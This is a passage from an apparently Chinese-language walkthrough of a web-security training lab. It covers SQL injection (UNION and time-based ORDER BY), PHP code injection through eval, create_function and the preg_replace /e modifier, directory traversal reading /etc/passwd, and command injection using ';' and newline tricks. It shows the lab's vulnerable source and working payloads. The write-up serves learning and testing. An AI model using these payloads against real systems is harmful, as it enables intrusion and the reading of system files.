class="hljs-keyword">if</span> (!preg_match(<span class="hljs-string">'/^-?[0-9]+$/m'</span>, $_GET[<span class="hljs-string">"id"</span>])) {</span><br><span class="line">    <span class="hljs-keyword">die</span>(<span class="hljs-string">"ERROR INTEGER REQUIRED"</span>);	</span><br><span class="line">}</span><br><span class="line">$sql = <span class="hljs-string">"SELECT * FROM users where id="</span>;</span><br><span class="line">$sql .= $_GET[<span class="hljs-string">"id"</span>];</span><br><span class="line"></span><br><span class="line">$result = mysql_query($sql);</span><br></pre></td></tr></tbody></table></figure><p></p><p>我们可以用<code>%0a</code>(换行)绕过纯数字匹配，<code>4%0Aor 1=1%23</code></p><p></p><figure class="highlight sql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1%0a union <span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">group_concat</span>(schema_name),<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span> <span class="hljs-keyword">from</span> information_schema.schemata %<span class="hljs-number">23</span></span><br></pre></td></tr></tbody></table></figure><p></p><h4 id="Example-8-1"><a href="#Example-8-1" class="headerlink" title="Example 8"></a>Example 8</h4><p></p><figure class="highlight awk hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="hljs-regexp">//</span><span class="hljs-number">172.16</span>.<span class="hljs-number">71.152</span><span class="hljs-regexp">/sqli/</span>example8.php?order=name</span><br></pre></td></tr></tbody></table></figure><p></p><p>很明显的一个<code>order</code>注入，尝试报错无回显，那就只能通过 bool 注入或者延时注入了，但是 fuzz 了很久，都无法绕过，最后看源代码发现用的是反引号…</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="hljs-string">"SELECT * FROM users ORDER BY `"</span>;</span><br><span class="line">$sql .= mysql_real_escape_string($_GET[<span class="hljs-string">"order"</span>]).<span class="hljs-string">"`"</span>;</span><br></pre></td></tr></tbody></table></figure><p></p><p>用 sqlmap 跑了一下，发现可以用</p><p></p><figure class="highlight sql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">order=name`=`name` AND SLEEP(5) AND `name`=`name</span><br><span class="line">order=name`=`name` AND 2137=(<span class="hljs-keyword">SELECT</span> (<span class="hljs-keyword">CASE</span> <span class="hljs-keyword">WHEN</span> (<span class="hljs-number">2137</span>=<span class="hljs-number">2137</span>) <span class="hljs-keyword">THEN</span> <span class="hljs-number">2137</span> <span class="hljs-keyword">ELSE</span> (<span class="hljs-keyword">SELECT</span> <span class="hljs-number">8927</span> <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-number">4832</span>) <span class="hljs-keyword">END</span>))<span class="hljs-comment">-- lMKk</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>成功延时，仔细分析，其实是构成了以下 payload</p><p></p><figure class="highlight sql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> <span class="hljs-string">`name`</span>=<span class="hljs-string">`name`</span> <span class="hljs-keyword">AND</span> <span class="hljs-keyword">SLEEP</span>(<span class="hljs-number">5</span>) <span class="hljs-keyword">AND</span> <span class="hljs-string">`name`</span>=<span class="hljs-string">`name`</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> <span class="hljs-string">`name`</span>=<span class="hljs-string">`name`</span> <span class="hljs-keyword">AND</span> <span class="hljs-number">2137</span>=(<span class="hljs-keyword">SELECT</span> (<span class="hljs-keyword">CASE</span> <span class="hljs-keyword">WHEN</span> (<span class="hljs-number">2137</span>=<span class="hljs-number">2137</span>) <span class="hljs-keyword">THEN</span> <span class="hljs-number">2137</span> <span class="hljs-keyword">ELSE</span> (<span class="hljs-keyword">SELECT</span> <span class="hljs-number">8927</span> <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-number">4832</span>) <span class="hljs-keyword">END</span>))<span class="hljs-comment">-- lMKk`</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>这样就看的比较明朗了，其实就是用两个字符串先进行相等，然后还是用的是<code>order by</code>后注入的方式</p><h4 id="Example-9-1"><a href="#Example-9-1" class="headerlink" title="Example 9"></a>Example 9</h4><p>比上个还要简单，直接测的是<code>rand(true)%23</code>，发现排序发生变化，于是就可以用 bool 注入了，就不再重复了。</p><h3 id="Code-injection"><a href="#Code-injection" class="headerlink" title="Code injection"></a>Code injection</h3><h4 id="Example-1-4"><a href="#Example-1-4" class="headerlink" title="Example 1"></a>Example 1</h4><p></p><figure class="highlight awk hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="hljs-regexp">//</span><span class="hljs-number">172.16</span>.<span class="hljs-number">71.152</span><span class="hljs-regexp">/codeexec/</span>example1.php?name=hacker</span><br></pre></td></tr></tbody></table></figure><p></p><p>回显</p><p></p><figure class="highlight erlang-repl hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hello hacker!!!</span><br></pre></td></tr></tbody></table></figure><p></p><p>尝试 xss</p><p></p><figure class="highlight xquery hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="hljs-number">172.16</span>.<span class="hljs-number">71.152</span>/codeexec/example1.php<span class="hljs-built_in">?name</span>=<span class="hljs-meta">%3Cscript</span><span class="hljs-meta">%3Ealert</span>(<span class="hljs-number">1</span>)<span class="hljs-meta">%3C</span>/script<span class="hljs-meta">%3E</span>//</span><br></pre></td></tr></tbody></table></figure><p></p><p>成功<code>alert</code>，没发现这题问题所在，讲道理这算是个 HTML 代码注入吧2333，尝试注入<code>$a</code>，发现有回显</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Notice: Undefined variable: a in /<span class="hljs-keyword">var</span>/www/codeexec/example1.php(<span class="hljs-number">6</span>) : <span class="hljs-keyword">eval</span>()<span class="hljs-string">'d code on line 1 Hello !!!</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>说明应该在<code>eval()</code>函数中，猜测是<code>eval(echo "$a!!!")</code>这样的方式，闭合双引号即可，</p><p></p><figure class="highlight 1c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-string">";system('whoami');echo "</span></span><br></pre></td></tr></tbody></table></figure><p></p><h4 id="Example-2-4"><a href="#Example-2-4" class="headerlink" title="Example 2"></a>Example 2</h4><p></p><figure class="highlight awk hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="hljs-regexp">//</span><span class="hljs-number">172.16</span>.<span class="hljs-number">71.152</span><span class="hljs-regexp">/codeexec/</span>example2.php?order=id</span><br></pre></td></tr></tbody></table></figure><p></p><p>传入<code>$id</code>，发现错误回显</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Notice: Undefined variable: id in /<span class="hljs-keyword">var</span>/www/codeexec/example2.php(<span class="hljs-number">22</span>) : runtime-created <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">on</span> <span class="hljs-title">line</span> 1 <span class="hljs-title">Fatal</span> <span class="hljs-title">error</span>: <span class="hljs-title">Cannot</span> <span class="hljs-title">access</span> <span class="hljs-title">empty</span> <span class="hljs-title">property</span> <span class="hljs-title">in</span> /<span class="hljs-title">var</span>/<span class="hljs-title">www</span>/<span class="hljs-title">codeexec</span>/<span class="hljs-title">example2</span>.<span class="hljs-title">php</span><span class="hljs-params">(<span class="hljs-number">22</span>)</span> : <span class="hljs-title">runtime</span>-<span class="hljs-title">created</span> <span class="hljs-title">function</span> <span class="hljs-title">on</span> <span class="hljs-title">line</span> 1</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>这个比较头大，我们直接分析源代码</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span>{</span><br><span class="line">  <span class="hljs-keyword">public</span> $id, $name, $age;</span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">($id, $name, $age)</span></span>{</span><br><span class="line">    <span class="hljs-keyword">$this</span>-&gt;name= $name;</span><br><span class="line">    <span class="hljs-keyword">$this</span>-&gt;age = $age;</span><br><span class="line">    <span class="hljs-keyword">$this</span>-&gt;id = $id;</span><br><span class="line">  }   </span><br><span class="line">}</span><br><span class="line">  <span class="hljs-keyword">require_once</span>(<span class="hljs-string">'../header.php'</span>);</span><br><span class="line">  <span class="hljs-keyword">require_once</span>(<span class="hljs-string">'../sqli/db.php'</span>);</span><br><span class="line">true$sql = <span class="hljs-string">"SELECT * FROM users "</span>;</span><br><span class="line"></span><br><span class="line">true$order = $_GET[<span class="hljs-string">"order"</span>];</span><br><span class="line">true$result = mysql_query($sql);</span><br><span class="line">  <span class="hljs-keyword">if</span> ($result) {</span><br><span class="line">truetrue<span class="hljs-keyword">while</span> ($row = mysql_fetch_assoc($result)) {</span><br><span class="line">      $users[] = <span class="hljs-keyword">new</span> User($row[<span class="hljs-string">'id'</span>],$row[<span class="hljs-string">'name'</span>],$row[<span class="hljs-string">'age'</span>]);</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($order)) { </span><br><span class="line">      usort($users, create_function(<span class="hljs-string">'$a, $b'</span>, <span class="hljs-string">'return strcmp($a-&gt;'</span>.$order.<span class="hljs-string">',$b-&gt;'</span>.$order.<span class="hljs-string">');'</span>));</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure><p></p><p>这里用到了<code>create_function</code>的一个 trick ，可以用<code>}</code>闭合<code>create_function</code>，所以我们可以用</p><p></p><figure class="highlight clean hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id,$b-&gt;id);}<span class="hljs-keyword">system</span>(<span class="hljs-string">'ls'</span>);<span class="hljs-comment">//</span></span><br></pre></td></tr></tbody></table></figure><p></p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610003780.jpg" alt=""></p><h4 id="Example-3-2"><a href="#Example-3-2" class="headerlink" title="Example 3"></a>Example 3</h4><p></p><figure class="highlight awk hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="hljs-regexp">//</span><span class="hljs-number">172.16</span>.<span class="hljs-number">71.152</span><span class="hljs-regexp">/codeexec/</span>example3.php?new=hacker&amp;pattern=<span class="hljs-regexp">/lamer/</span>&amp;base=Hello%<span class="hljs-number">20</span>lamer</span><br></pre></td></tr></tbody></table></figure><p></p><p>这里我们直接看代码算了…</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line">true<span class="hljs-keyword">echo</span> preg_replace($_GET[<span class="hljs-string">"pattern"</span>], $_GET[<span class="hljs-string">"new"</span>], $_GET[<span class="hljs-string">"base"</span>]);</span><br></pre></td></tr></tbody></table></figure><p></p><p></p><figure class="highlight autoit hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, <span class="hljs-built_in">int</span> $limit = <span class="hljs-number">-1</span> [, <span class="hljs-built_in">int</span> &amp;$count ]] ) : mixed</span><br></pre></td></tr></tbody></table></figure><p></p><p>使用<code>/e</code>修饰符，<code>preg_replace</code>会将<code>replacement</code>参数当作 PHP 代码执行，也就是<code>$_GET['new']</code></p><p>所以用<code>new=system('id');&amp;pattern=/test/e&amp;base=jutst test</code>，即可执行任意命令。</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008506.jpg" alt=""></p><h3 id="File-Upload"><a href="#File-Upload" class="headerlink" title="File Upload"></a>File Upload</h3><h4 id="Example-1-5"><a href="#Example-1-5" class="headerlink" title="Example 1"></a>Example 1</h4><p>毫无过滤的文件上传</p><h4 id="Example-2-5"><a href="#Example-2-5" class="headerlink" title="Example 2"></a>Example 2</h4><p>使用<code>.php3</code>进行后缀绕过</p><h3 id="Directory-traversal"><a href="#Directory-traversal" class="headerlink" title="Directory traversal"></a>Directory traversal</h3><h4 id="Example-1-6"><a href="#Example-1-6" class="headerlink" title="Example 1"></a>Example 1</h4><p></p><figure class="highlight awk hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="hljs-regexp">//</span><span class="hljs-number">172.16</span>.<span class="hljs-number">71.152</span><span class="hljs-regexp">/dirtrav/</span>example1.php?file=..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>etc<span class="hljs-regexp">/passwd</span></span><br></pre></td></tr></tbody></table></figure><p></p><h4 id="Example-2-6"><a href="#Example-2-6" class="headerlink" title="Example 2"></a>Example 2</h4><p></p><figure class="highlight awk hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="hljs-regexp">//</span><span class="hljs-number">172.16</span>.<span class="hljs-number">71.152</span><span class="hljs-regexp">/dirtrav/</span>example2.php?file=<span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/files/</span>hacker.png</span><br></pre></td></tr></tbody></table></figure><p></p><p>直接访问<code>/etc/passwd</code>不行，用<code>../</code>绕过</p><p></p><figure class="highlight awk hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="hljs-regexp">//</span><span class="hljs-number">172.16</span>.<span class="hljs-number">71.152</span><span class="hljs-regexp">/dirtrav/</span>example2.php?file=<span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/files/</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/etc/</span>passwd</span><br></pre></td></tr></tbody></table></figure><p></p><h4 id="Example-3-3"><a href="#Example-3-3" class="headerlink" title="Example 3"></a>Example 3</h4><p></p><figure class="highlight awk hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="hljs-regexp">//</span><span class="hljs-number">172.16</span>.<span class="hljs-number">71.152</span><span class="hljs-regexp">/dirtrav/</span>example3.php?file=hacker</span><br></pre></td></tr></tbody></table></figure><p></p><p>猜测结尾有附加<code>.jpg</code>，用<code>%00</code>截断</p><p></p><figure class="highlight awk hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="hljs-regexp">//</span><span class="hljs-number">172.16</span>.<span class="hljs-number">71.152</span><span class="hljs-regexp">/dirtrav/</span>example3.php?file=..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/etc/</span>passwd%<span class="hljs-number">00</span></span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="Commands-injection"><a href="#Commands-injection" class="headerlink" title="Commands injection"></a>Commands injection</h3><h4 id="Example-1-7"><a href="#Example-1-7" class="headerlink" title="Example 1"></a>Example 1</h4><p></p><figure class="highlight awk hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="hljs-regexp">//</span><span class="hljs-number">172.16</span>.<span class="hljs-number">71.152</span><span class="hljs-regexp">/commandexec/</span>example1.php?ip=<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>加<code>;id</code>执行命令</p><h4 id="Example-2-7"><a href="#Example-2-7" class="headerlink" title="Example 2"></a>Example 2</h4><p>用<code>;</code>发现回显</p><p></p><figure class="highlight routeros hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invalid<span class="hljs-built_in"> IP </span>address</span><br></pre></td></tr></tbody></table></figure><p></p><p>于是用<code>%0a</code>换行执行命令</p><h4 id="Example-3-4"><a href="#Example-3-4" class="headerlink" title="Example 3"></a>Example 3</h4><p>直接在后面加貌似会被先过滤跳转，放到 burp 里面加就行了</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAg